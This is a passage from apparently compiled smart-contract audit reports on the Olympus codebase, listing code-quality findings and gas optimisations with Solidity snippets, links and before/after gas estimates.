constant ENDORSEMENT_THRESHOLD = 20;      /// @notice Net votes required to execute a proposal on chain as a percentage of total supply.     uint256 public constant EXECUTION_THRESHOLD = 33;  ```  ## [N-02] Unreachable code `return true;` is unreachable in the following code. It can be removed for better readability and maintainability.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L45-L48 ```solidity     function transfer(address to_, uint256 amount_) public pure override returns (bool) {         revert VOTES_TransferDisabled();         return true;     } ```  ## [N-03] decimals CAN BE NAMED USING CAPITAL LETTERS AND UNDERSCORES Because the following `decimals` is a constant, it can be named using capital letters and underscores by convention, which improves readability and maintainability.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59 ```solidity     uint8 public constant decimals = 18; ```  ## [N-04] CONSTANTS CAN BE USED INSTEAD OF MAGIC NUMBERS To improve readability and maintainability, constants can be used instead of the magic numbers. Please consider replacing the magic numbers used in the following code with constants. ```solidity modules\PRICE.sol   90: if (exponent > 38) revert Price_InvalidParams();     modules\RANGE.sol   245: wallSpread_ > 10000 ||    246: wallSpread_ < 100 ||    247: cushionSpread_ > 10000 ||    248: cushionSpread_ < 100 ||   policies\Governance.sol   164: if (VOTES.balanceOf(msg.sender) * 10000 < VOTES.totalSupply() * SUBMISSION_REQUIREMENT)   217: (totalEndorsementsForProposal[proposalId_] * 100) <  policies\Operator.sol   103: if (configParams[1] > uint256(7 days) || configParams[1] < uint256(1 days))   106: if (configParams[2] < uint32(10_000)) revert Operator_InvalidParams();   108: if (configParams[3] < uint32(1 hours) || configParams[3] > configParams[1])   111: if (configParams[4] > 10000 || configParams[4] < 100) revert Operator_InvalidParams();   114: configParams[5] < 1 hours ||   378: 36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals      433: 36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals      533: if (duration_ > uint256(7 days) || duration_ < uint256(1 days))   535: if (debtBuffer_ < uint32(10_000)) revert Operator_InvalidParams();   536: if (depositInterval_ < uint32(1 hours) || depositInterval_ > duration_)   550: if (reserveFactor_ > 10000 || reserveFactor_ < 100) revert Operator_InvalidParams();   565: if (wait_ < 1 hours || threshold_ > observe_ || observe_ == 0) ```  ## [N-05] INCOMPLETE NATSPEC COMMENTS NatSpec comments provide rich code documentation. @param or @return comments are missing for the following functions. Please consider completing NatSpec comments for them. ```solidity Kernel.sol   235: function executeAction(Actions action_, address target_) external onlyExec   351: function _migrateKernel(Kernel newKernel_) internal      439: function grantRole(Role role_, address addr_) public onlyAdmin {     451: function revokeRole(Role role_, address addr_) public onlyAdmin {  modules\TRSRY.sol   64: function setApprovalFor(     75: function withdrawReserves(     92: function getLoan(ERC20 token_, uint256 amount_) external permissioned {     105: function repayLoan(ERC20 token_, uint256 amount_) external nonReentrant {     122: function setDebt(    modules\VOTES.sol   45: function transfer(address to_, uint256 amount_) public pure override returns (bool) {     51: function transferFrom(   ```  ## [N-06] MISSING NATSPEC COMMENTS NatSpec comments provide rich code documentation. NatSpec comments are missing for the following functions. Please consider adding them. ```solidity Kernel.sol   266: function _installModule(Module newModule_) internal {     279: function _upgradeModule(Module newModule_) internal {     295: function _activatePolicy(Policy policy_) internal {     325: function _deactivatePolicy(Policy policy_) internal {     378: function _reconfigurePolicies(Keycode keycode_) internal {    391: function _setPolicyPermissions(    409: function _pruneFromDependents(Policy policy_) internal {   modules\MINTR.sol   33: function mintOhm(address to_, uint256 amount_) public permissioned {      37: function burnOhm(address from_, uint256 amount_) public permissioned {     modules\TRSRY.sol   47: function KEYCODE() public pure override returns (Keycode) {     51: function VERSION() external pure override returns (uint8 major, uint8 minor) {     59: function getReserveBalance(ERC20 token_) external view returns (uint256) {     137: function _checkApproval(    modules\VOTES.sol   35: function mintTo(address wallet_, uint256 amount_) external permissioned {     39: function burnFrom(address wallet_, uint256 amount_) external permissioned {    utils\KernelUtils.sol   11: function toKeycode(bytes5 keycode_) pure returns (Keycode) {      16: function fromKeycode(Keycode keycode_) pure returns (bytes5) {     21: function toRole(bytes32 role_) pure returns (Role) {     26: function fromRole(Role role_) pure returns (bytes32) {     31: function ensureContract(address target_) view {     40: function ensureValidKeycode(Keycode keycode_) pure {     55: function ensureValidRole(Role role_) pure {   ```
## QA  ### Missing checks for address(0x0) when assigning values to address state variables  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L251  ```solidity File: /src/Kernel.sol 251:            executor = target_;  253:            admin = target_; ```  ### constants should be defined rather than using magic numbers There are several occurrences of literal values with unexplained meaning .Literal values in the codebase without an explained meaning make the code harder to read, understand and maintain, thus hindering the experience of developers, auditors and external contributors alike.  Developers should define a constant variable for every magic value used , giving it a clear and self-explanatory name. Additionally, for complex values, inline comments explaining how they were calculated or why they were chosen are highly recommended. Following [Solidity’s style guide](https://solidity.readthedocs.io/en/latest/style-guide.html#constants), constants should be named in UPPER_CASE_WITH_UNDERSCORES format, and specific public getters should be defined to read each one of them.  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L242-L250  ```solidity File: /src/modules/RANGE.sol     function setSpreads(uint256 cushionSpread_, uint256 wallSpread_) external permissioned {         // Confirm spreads are within allowed values         if (             wallSpread_ > 10000 ||  //@audit 1000             wallSpread_ < 100 ||    //@audit 100             cushionSpread_ > 10000 || //@audit 1000             cushionSpread_ < 100 || //@audit 100             cushionSpread_ > wallSpread_         ) revert RANGE_InvalidParams();       264:         if (thresholdFactor_ > 10000 || thresholdFactor_ < 100) revert RANGE_InvalidParams();   ```  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L90 ```solidity File: /src/modules/PRICE.sol @audit: 38 90:        if (exponent > 38) revert Price_InvalidParams();  ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L376-L379 ```solidity File: /src/policies/Operator.sol 376:            uint256 bondScale = 10 **  //@audit: 10 378:                uint8( 379:                    36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals //@audit: 36 340:                );  430:            uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals); //@audit: 10 431:            uint256 bondScale = 10 ** //@audit: 10 432:                uint8( 433:                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals //@audit: 36 434:                );  486:        while (price_ >= 10) { // @audit: 10 487:            price_ = price_ / 10;  // @audit: 10  518:        if (cushionFactor_ > 10000 || cushionFactor_ < 100) revert Operator_InvalidParams(); //@audit: 10000 & 100  535:        if (debtBuffer_ < uint32(10_000)) revert Operator_InvalidParams(); //@audit: 10_000  550:        if (reserveFactor_ > 10000 || reserveFactor_ < 100) revert Operator_InvalidParams(); //@audit: 1000 & 100  753:                10**reserveDecimals * RANGE.price(true, false),  // @audit: 10 754:                10**ohmDecimals * 10**PRICE.decimals()  // @audit: 10  764:                10**ohmDecimals * 10**PRICE.decimals(), // @audit: 10 765:                10**reserveDecimals * RANGE.price(true, true) // @audit: 10  784:                    10**ohmDecimals * 10**PRICE.decimals(),  // @audit: 10 785:                    10**reserveDecimals * RANGE.price(true, true)  // @audit: 10 ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L164 ```solidity File: /src/policies/Governance.sol 164:        if (VOTES.balanceOf(msg.sender) * 10000 < VOTES.totalSupply() * SUBMISSION_REQUIREMENT) // @audit: 10000  217:            (totalEndorsementsForProposal[proposalId_] * 100) < //@audit: 100  268:         if (netVotes * 100 < VOTES.totalSupply() * EXECUTION_THRESHOLD) { //@audit: 100 ```   ### Non-assembly method available ```assembly { size := extcodesize() } => uint256 size = address().code.length``` We can minimize the complexity of the project by avoiding  using assembly where it's not necessary  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L31-L37 ```solidity File: /src/utils/KernelUtils.sol 31:   function ensureContract(address target_) view { 32:     uint256 size; 33:     assembly { 34:        size := extcodesize(target_) 35:    } 36:    if (size == 0) revert TargetNotAContract(target_); 37: }  ``` ### public functions not called by the contract should be declared external instead Contracts are allowed to override their parents' functions and change the visibility from external to public.  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L451-L458 ```solidity File: /src/Kernel.sol 451:    function revokeRole(Role role_, address addr_) public onlyAdmin { 452:        if (!isRole[role_]) revert Kernel_RoleDoesNotExist(role_); 453:        if (!hasRole[addr_][role_]) revert Kernel_AddressDoesNotHaveRole(addr_, role_);  455:        hasRole[addr_][role_] = false; 456: 457:        emit RoleRevoked(role_, addr_); 458:    }  ```  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L451-L458  ```solidity File: /src/Kernel.sol     function grantRole(Role role_, address addr_) public onlyAdmin {         if (hasRole[addr_][role_]) revert Kernel_AddressAlreadyHasRole(addr_, role_);          ensureValidRole(role_);         if (!isRole[role_]) isRole[role_] = true;          hasRole[addr_][role_] = true;          emit RoleGranted(role_, addr_);     } ```  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L75-L85  ```solidity File: /src/modules/TRSRY.sol     function withdrawReserves(         address to_,         ERC20 token_,         uint256 amount_     ) public {         _checkApproval(msg.sender, token_, amount_);          token_.safeTransfer(to_, amount_);          emit Withdrawal(msg.sender, to_, token_, amount_);     } ```  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L215-L219 ```solidity File: /src/modules/RANGE.sol     function updateMarket(         bool high_,         uint256 market_,         uint256 marketCapacity_     ) public permissioned { ```  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L37 ```solidity File: /src/modules/INSTR.sol 37:    function getInstructions(uint256 instructionsId_) public view returns (Instruction[] memory) {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L145 ```solidity File: /src/policies/Governance.sol 145:    function getMetadata(uint256 proposalId_) public view returns (ProposalMetadata memory) {  151:    function getActiveProposal() public view returns (ActivatedProposal memory) {  ```  ### Event is missing indexed fields  Index event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each event should use three indexed fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.  7 instances https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L20-L31  ```solidity File: /src/modules/RANGE.sol 20:    event WallUp(bool high_, uint256 timestamp_, uint256 capacity_);  21:    event WallDown(bool high_, uint256 timestamp_, uint256 capacity_);  22:    event CushionUp(bool high_, uint256 timestamp_, uint256 capacity_);  23:    event CushionDown(bool high_, uint256 timestamp_);  24:    event PricesChanged( 25:        uint256 wallLowPrice_, 26:        uint256 cushionLowPrice_, 27:        uint256 cushionHighPrice_, 28:        uint256 wallHighPrice_ 29:    );  30:    event SpreadsChanged(uint256 cushionSpread_, uint256 wallSpread_);  31:    event ThresholdFactorChanged(uint256 thresholdFactor_); ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L26-L28 ```solidity File: /src/modules/PRICE.sol 26:    event NewObservation(uint256 timestamp_, uint256 price_, uint256 movingAverage_);  27:    event MovingAverageDurationChanged(uint48 movingAverageDuration_);  28:    event ObservationFrequencyChanged(uint48 observationFrequency_); ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/INSTR.sol#L11 ```solidity File: /src/modules/INSTR.sol 11:    event InstructionsStored(uint256 instructionsId); ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L51-L54 ```solidity File: /src/policies/Operator.sol 51:    event CushionFactorChanged(uint32 cushionFactor_);  52:    event CushionParamsChanged(uint32 duration_, uint32 debtBuffer_, uint32 depositInterval_);  53:    event ReserveFactorChanged(uint32 reserveFactor_);  54:    event RegenParamsChanged(uint32 wait_, uint32 threshold_, uint32 observe_); ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L28-L30 ```solidity File: /src/policies/Heart.sol 28:    event Beat(uint256 timestamp_);  29:    event RewardIssued(address to_, uint256 rewardAmount_);  30:    event RewardUpdated(ERC20 token_, uint256 rewardAmount_); ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L86-L90 ```solidity File: /src/policies/Governance.sol 86:    event ProposalSubmitted(uint256 proposalId);  87:    event ProposalEndorsed(uint256 proposalId, address voter, uint256 amount);  88:    event ProposalActivated(uint256 proposalId, uint256 timestamp);  89:    event WalletVoted(uint256 proposalId, address voter, bool for_, uint256 userVotes);  90:    event ProposalExecuted(uint256 proposalId); ```  ### Unused named return Using both named returns and a return statement isn’t necessary in  a function.To  improve code quality, consider using only one of those.  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L51-L53  ```solidity File: /src/modules/TRSRY.sol 51:    function VERSION() external pure override returns (uint8 major, uint8 minor) { 52:        return (1, 0); 53:    }  ``` https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L115-L117 ```solidity File: /src/modules/RANGE.sol 115:    function VERSION() external pure override returns (uint8 major, uint8 minor) { 116:        return (1, 0); 117:    }  ```  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L113-L115 ```solidity File: /src/modules/PRICE.sol 113:    function VERSION() external pure override returns (uint8 major, uint8 minor) { 114:        return (1, 0); 115:    } ```  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L27-L29 ```solidity File: /src/modules/VOTES.sol 27:    function VERSION() external pure override returns (uint8 major, uint8 minor) { 28:        return (1, 0); 29:    } ```  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L28-L30 ```solidity File: /src/modules/INSTR.sol 28:    function VERSION() public pure override returns (uint8 major, uint8 minor) { 29:        return (1, 0); 30:    } ```  ### Natspec is incomplete https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L234-L235 ```solidity File: /src/Kernel.sol  //@audit: Missing @param newKernel_ 75:    /// @notice Function used by kernel when migrating to a new kernel. 76:    function changeKernel(Kernel newKernel_) external onlyKernel {  //@audit: Missing @param action_ , @param target 234:    /// @notice Main kernel function. Initiates state changes to kernel depending on Action passed in. 235:    function executeAction(Actions action_, address target_) external onlyExecutor {   //@audit: Missing @param role_, @param addr_ 438:    /// @notice Function to grant policy-defined roles to some address. Can only be called by admin. 439:    function grantRole(Role role_, address addr_) public onlyAdmin {   //@audit: Missing @param role_, @param addr_ 450:    /// @notice Function to revoke policy-defined roles from some address. Can only be called by admin. 451:    function revokeRole(Role role_, address addr_) public onlyAdmin { ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L63-L68 ```solidity File: /src/modules/TRSRY.sol  //@audit: Missing @param withdrawer_,@param token_ , @param amount_ 63: /// @notice Sets approval for specific withdrawer addresses 64:    function setApprovalFor( 65:        address withdrawer_, 66:        ERC20 token_, 67:        uint256 amount_ 68:    ) external permissioned {  //@audit: Missing @param token_, @param amount_ 92:    function getLoan(ERC20 token_, uint256 amount_) external permissioned {  //@audit: Missing @param token_, @param amount_ 105:    function repayLoan(ERC20 token_, uint256 amount_) external nonReentrant {   //@audit: Missing @param withdrawer_,@param token_ , @param amount_ 122:    function setDebt( 123:        ERC20 token_, 124:        address debtor_, 125:        uint256 amount_ 126:    ) external permissioned { ```   https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/INSTR.sol#L41-L42 ```solidity File: /src/modules/INSTR.sol  //@audit: Missing @param instructions_, @param returns  41:    /// @notice Store a list of Instructions to be executed in the future. 42:    function store(Instruction[] calldata instructions_) external permissioned returns (uint256) { ```  ### Open todos https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/TreasuryCustodian.sol#L51  ```solidity File: /src/policies/TreasuryCustodian.sol  51:    // TODO Currently allows anyone to revoke any approval EXCEPT activated policies. 52:    // TODO must reorg policy storage to be able to check for deactivated policies.  56:   // TODO Make sure `policy_` is an actual policy and not a random address.  ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L657 ```solidity File: /src/policies/Operator.sol 657:        /// TODO determine if this should use the last price from the MA or recalculate the current price, ideally last price is ok since it should have been just updated and should include check against secondary?  ```  ### Lack of event emission after critical initialize() functions  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L205 ```solidity File: /src/modules/PRICE.sol 205:     function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_) ```  ### The nonReentrant modifier should occur before all other modifiers This is a best-practice to protect against reentrancy in other modifiers  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L272 ```solidity File: /src/policies/Operator.sol     function swap(         ERC20 tokenIn_,         uint256 amountIn_,         uint256 minAmountOut_     ) external override onlyWhileActive nonReentrant returns (uint256 amountOut) { ``` 
## FINDINGS  NB: *Some functions have been truncated where neccessary to just show affected parts of the code* The gas estimates are the exact results from running the tests included with an exception of internal functions(we estimate based on number of SLOADS saved) The optimizer is set to run with the default runs(200). Throught the report some places might be denoted with audit tags to show the actual place affected.  ### Using immutable on variables that are only set in the constructor and never after  Use immutable if you want to assign a permanent value at construction. Use constants if you already know the permanent value. Both get directly embedded in bytecode, saving SLOAD. Variables only set in the constructor and never edited afterwards should be marked as immutable, as it would avoid the expensive storage-writing operation in the constructor (around 20 000 gas per variable) and replace the expensive storage-reading operations (around 2100 gas per reading) to a less expensive value reading (3 gas)  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L28 ```solidity File: /src/policies/BondCallback.sol 28:    IBondAggregator public aggregator;  ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L32 ```solidity File: /src/policies/BondCallback.sol 32:    ERC20 public ohm;  ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L48 ```solidity File: /src/policies/Heart.sol 48:    IOperator internal _operator; ```   ### The result of a function call should be cached rather than re-calling the function   https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L92-L109 ### Heart.sol.beat(): frequency() should be cached(Saves ~351 gas) ``` Average Gas Before: 29228       Average Gas After: 28871 ```  ```solidity File: /src/policies/Heart.sol 92:    function beat() external nonReentrant { 93:        if (!active) revert Heart_BeatStopped(); 94:        if (block.timestamp < lastBeat + frequency()) revert Heart_OutOfCycle(); //@audit: frequency()              ... 102:        // Update the last beat timestamp 103:        lastBeat += frequency(); //@audit: frequency()              ... 109:    } ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/PriceConfig.sol#L25-L35 ### PriceConfig.sol.requestPermissions():PRICE.KEYCODE() should be cached( Saves ~1472 gas) ``` Average Gas Before: 3956       Average Gas After: 2484 ```  ```solidity File: /src/policies/PriceConfig.sol 25:    function requestPermissions() 26:        external 27:        view 28:        override 29:        returns (Permissions[] memory permissions) 30:    { 31:        permissions = new Permissions[](3); 32:        permissions[0] = Permissions(PRICE.KEYCODE(), PRICE.initialize.selector); //@audit: PRICE.KEYCODE() 33:        permissions[1] = Permissions(PRICE.KEYCODE(), PRICE.changeMovingAverageDuration.selector); 34:        permissions[2] = Permissions(PRICE.KEYCODE(), PRICE.changeObservationFrequency.selector); 35:    } ```  **The above can be rewriten as follows:** ```solidity     function requestPermissions()external view override returns (Permissions[] memory permissions){        Keycode PRICE_KEYCODE = PRICE.KEYCODE();         permissions = new Permissions[](3);         permissions[0] = Permissions(PRICE_KEYCODE, PRICE.initialize.selector); //@audit: PRICE.KEYCODE()         permissions[1] = Permissions(PRICE_KEYCODE, PRICE.changeMovingAverageDuration.selector);         permissions[2] = Permissions(PRICE_KEYCODE, PRICE.changeObservationFrequency.selector);     } ```  **Other Instance:** https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/VoterRegistration.sol#L27-L36 ### VoterRegistration.sol.requestPermissions():VOTES.KEYCODE() should be cached( Saves ~758 gas) ``` Average Gas Before: 2863       Average Gas After: 2105 ```  ```solidity File: /src/policies/VoterRegistration.sol 27:    function requestPermissions() 28:        external 29:        view 30:        override 31:        returns (Permissions[] memory permissions) 32:    { 33:        permissions = new Permissions[](2); 34:        permissions[0] = Permissions(VOTES.KEYCODE(), VOTES.mintTo.selector); 35:        permissions[1] = Permissions(VOTES.KEYCODE(), VOTES.burnFrom.selector); 36:    } ```  See an existing implementation already on [Line 34](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/TreasuryCustodian.sol#L34-L40) for how to implement the above function ```solidity     function requestPermissions() external view override returns (Permissions[] memory requests) {         Keycode TRSRY_KEYCODE = TRSRY.KEYCODE();            requests = new Permissions[](2);         requests[0] = Permissions(TRSRY_KEYCODE, TRSRY.setApprovalFor.selector);         requests[1] = Permissions(TRSRY_KEYCODE, TRSRY.setDebt.selector);     } ```  ### Use calldata instead of memory for function parameters When a function with a memory array is called externally, the abi.decode() step has to use a for-loop to copy each index of the calldata to the memory index. Each iteration of this for-loop costs at least 60 gas (i.e. 60 * <mem_array>.length). Using calldata directly, obliviates the need for such a loop in the contract code and runtime execution.When arguments are read-only on external functions, the data location should be calldata:  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L205 ### PRICE.sol.initialize(): uint256\[] memory startObservations_ should be uint256[] calldata startObservations_(Saves ~ 1933 gas) ``` Average Gas Before: 432495       Average Gas After: 430562 ```  ```solidity File: /src/modules/PRICE.sol     function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_)         external         permissioned     {         if (initialized) revert Price_AlreadyInitialized();          // Cache numObservations to save gas.         uint256 numObs = observations.length;          // Check that the number of start observations matches the number expected         if (startObservations_.length != numObs || lastObservationTime_ > uint48(block.timestamp))             revert Price_InvalidParams();         // Push start observations into storage and total up observations         uint256 total;         for (uint256 i; i < numObs; ) {             if (startObservations_[i] == 0) revert Price_InvalidParams();             total += startObservations_[i];             observations[i] = startObservations_[i];             unchecked {                 ++i;             }         }         // Set moving average, last observation time, and initialized flag         _movingAverage = total / numObs;         lastObservationTime = lastObservationTime_;         initialized = true;     } ```  `startObservations_` should be declared calldata as it is readonly on this function  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/TreasuryCustodian.sol#L53-L67 ### TreasuryCustodian.sol.revokePolicyApprovals(): ERC20\[] memory tokens_should be ERC20\[] calldata tokens_(Saves ~ 114 gas) ``` Average Gas Before: 6956       Average Gas After: 6842 ```  ```solidity File: /src/policies/TreasuryCustodian.sol     function revokePolicyApprovals(address policy_, ERC20[] memory tokens_) external {         if (Policy(policy_).isActive()) revert PolicyStillActive();          // TODO Make sure `policy_` is an actual policy and not a random address.          uint256 len = tokens_.length;         for (uint256 j; j < len; ) {             TRSRY.setApprovalFor(policy_, tokens_[j], 0);             unchecked {                 ++j;             }         }          emit ApprovalRevoked(policy_, tokens_);     } ``` `ERC20[] memory tokens_` should be declared as `ERC20[] calldata tokens_` as it is readonly in this function  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L152-L166 ### BondCallback.sol.batchToTreasury(): ERC20\[] memory tokens_should be ERC20\[] calldata tokens_(Saves ~ 186 gas) ``` Average Gas Before: 12729       Average Gas After: 12543 ```  ```solidity File: /src/policies/BondCallback.sol     function batchToTreasury(ERC20[] memory tokens_) external onlyRole("callback_admin") {         ERC20 token;         uint256 balance;         uint256 len = tokens_.length;         for (uint256 i; i < len; ) {             token = tokens_[i];             balance = token.balanceOf(address(this));             token.safeTransfer(address(TRSRY), balance);             priorBalances[token] = token.balanceOf(address(this));               unchecked {                 ++i;             }         }     } ``` `ERC20[] memory tokens_` should be declared as `ERC20[] calldata tokens_` as it is readonly in this function  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/PriceConfig.sol#L45-L50 ### PriceConfig.sol.initialize(): uint256[] memory startObservations_ should be uint256[] calldata startObservations_(Saves ~ 3580 gas) ``` Average Gas Before: 491657       Average Gas After: 488077 ```  ```solidity File: /src/policies/PriceConfig.sol 45:    function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_) 46:        external 47:        onlyRole("price_admin") 48:    { 49:        PRICE.initialize(startObservations_, lastObservationTime_); 50:    }  ``` `uint256[] memory startObservations_` should be declared as `uint256[] calldata startObservations_` as it is readonly in this function   https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L159-L163 ### Governance.sol.submitProposal(): string memory proposalURI_ should be string memory proposalURI_ (Saves ~ 3580 gas) ``` Average Gas Before: 491657       Average Gas After: 488077 ```  ```solidity File: /src/policies/Governance.sol 159:    function submitProposal( 160:        Instruction[] calldata instructions_, 161:        bytes32 title_, 162:        string memory proposalURI_ 163:    ) external {  ``` `string memory proposalURI_` should be declared as `string calldata proposalURI_` as it is readonly in this function  ### Caching storage values in memory to minimize SLOADs The code can be optimized by minimizing the number of SLOADs.  SLOADs are expensive (100 gas after the 1st one) compared to MLOADs/MSTOREs (3 gas each). Storage values read multiple times should instead be cached in memory the first time (costing 1 SLOAD) and then read from this cache to avoid multiple SLOADs.  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L122-L147 ### PRICE.sol.updateMovingAverage(): nextObsIndex should be cached(Saves ~123 gas) ``` Average Gas before:9124   Average Gas After: 9001 ``` The gas saved ends up being higher than the estimates if we optimize the functions that are also called inside this one **(~259 gas)** ```solidity File: /src/modules/PRICE.sol 122:    function updateMovingAverage() external permissioned {             ... 129:        // Get earliest observation in window 130:        uint256 earliestPrice = observations[nextObsIndex];             ... 141:        // Push new observation into storage and store timestamp taken at 142:        observations[nextObsIndex] = currentPrice; 143:        lastObservationTime = uint48(block.timestamp); 144:        nextObsIndex = (nextObsIndex + 1) % numObs;             ... 147:    } ```  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L154-L180 ### PRICE.sol.getCurrentPrice(): observationFrequency should be cached(Saves ~134 gas) ``` Average Gas before:5264   Average Gas After: 5130 ```  ```solidity File: /src/modules/PRICE.sol 154:    function getCurrentPrice() public view returns (uint256) { 155:        if (!initialized) revert Price_NotInitialized();                ... 165:            if (updatedAt < block.timestamp - 3 * uint256(observationFrequency)) 166:                revert Price_BadFeed(address(_ohmEthPriceFeed));                  ... 171:            if (updatedAt < block.timestamp - uint256(observationFrequency)) 172:                revert Price_BadFeed(address(_reserveEthPriceFeed));  ```   https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L122-L147 ### PRICE.sol.updateMovingAverage(): \_movingAverage should be cached(Saves 1 sload ~ 99 gas ) ``` Average Gas before:9137   Average Gas After: 9038 ```  ```solidity File: /src/modules/PRICE.sol 122:    function updateMovingAverage() external permissioned {             ... 134:        // Calculate new moving average 135:        if (currentPrice > earliestPrice) { 136:            _movingAverage += (currentPrice - earliestPrice) / numObs;  //@audit: SLOAD 1 on happy path 137:        } else { 138:            _movingAverage -= (earliestPrice - currentPrice) / numObs;  //@audit: SLOAD 1 on sad path 139:        }             ... 146:        emit NewObservation(block.timestamp, currentPrice, _movingAverage);//@audit: SLOAD 2 147:    } ```   https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L183-L187 ### PRICE.sol.getLastPrice(): nextObsIndex should be cached(Saves 1 sload ~94 gas)  ```solidity File: /src/modules/PRICE.sol 183:    function getLastPrice() external view returns (uint256) { 184:        if (!initialized) revert Price_NotInitialized(); 185:        uint32 lastIndex = nextObsIndex == 0 ? numObservations - 1 : nextObsIndex - 1; 186:        return observations[lastIndex]; 187:    }  ```  ### PRICE.sol.changeMovingAverageDuration(): observationFrequency should be 